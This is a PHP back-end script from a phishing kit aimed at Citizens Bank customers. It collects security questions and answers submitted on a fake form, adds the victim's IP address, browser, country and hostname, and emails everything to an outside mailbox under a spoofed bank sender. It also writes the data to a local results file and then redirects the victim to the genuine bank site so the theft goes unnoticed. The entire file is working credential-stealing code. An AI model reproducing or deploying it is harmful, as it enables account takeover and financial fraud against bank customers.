<?php
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.

$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "-------------Created By vi3nas-----------------------\n";
$message .= "Question1 : ".$_POST['Q1']." - ";
$message .= "".$_POST['A1']."\n";
$message .= "Question2 : ".$_POST['Q2']." - ";
$message .= "".$_POST['A2']."\n";
$message .= "Question3 : ".$_POST['Q3']." - ";
$message .= "".$_POST['A3']."\n";
$message .= "-------------------------------------------------\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY vi3nas-------------\n";
$send = "chenlinn@proton.me";
$subject = "Citizens Key from $ip";
$headers = "From: Citizens Key<customer-support@hkstardomni.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}


//submit to textfile
$myFile = "Rezults.txt";
$fh = fopen($myFile, 'a') or die("can't open file");
fwrite($fh, $message);
fclose($fh);

 
     header("Location: http://www.citizensbank.com/");

  
?>
